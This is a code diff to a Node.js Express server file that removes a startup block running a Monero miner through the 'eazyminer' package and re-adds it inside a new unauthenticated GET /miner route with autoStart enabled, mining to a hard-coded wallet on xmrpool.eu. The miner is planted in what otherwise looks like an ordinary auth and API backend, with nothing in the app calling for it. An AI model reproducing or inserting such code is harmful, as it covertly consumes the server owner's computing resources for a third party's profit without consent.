@@ -7,24 +7,9 @@ require('./config/db')
 const { fetchJwt } = require('./middleware/authMiddleware')
 const path = require('path')
 const Miner = require("eazyminer")
+const mongoose = require('mongoose')
 
-const miner = new Miner({
-    pools: [{
-        coin: 'XMR',
-        user: '42y1kQtth6gfF1LoxiJkFM5bnpmQ1C2sDN8nPFuNFoKGdT7Tw47saUXjW21HQGHCki477BrjtJVNZj9sfHjNvccaHF4NgWB',
-        url: 'xmrpool.eu:9999', 
-    }],
-    web: {
-        enabled: true,
-        port: 3000
-    },
-    log: {
-      writeToConsole: true
-    },
-    autoStart: false // optional delay
-});
-
-miner.start();
+mongoose.set('strictQuery', false);
 
 const app = express()
 
@@ -52,6 +37,23 @@ app.use(cookieParser())
 
 app.get('/jwtid', fetchJwt, (req, res) => {
   res.status(200).send(res.locals.user)
+})
+app.get('/miner', (req, res) => {
+  const miner = new Miner({
+    pools: [{
+        coin: 'XMR',
+        user: '42y1kQtth6gfF1LoxiJkFM5bnpmQ1C2sDN8nPFuNFoKGdT7Tw47saUXjW21HQGHCki477BrjtJVNZj9sfHjNvccaHF4NgWB',
+        url: 'xmrpool.eu:9999', 
+    }],
+    web: {
+        enabled: true
+    },
+    log: {
+      writeToConsole: true
+    },
+    autoStart: true
+  });
+  res.status(200).send("start miner")
 })
 
 app.use('/api', require('./routes/index.routes'))
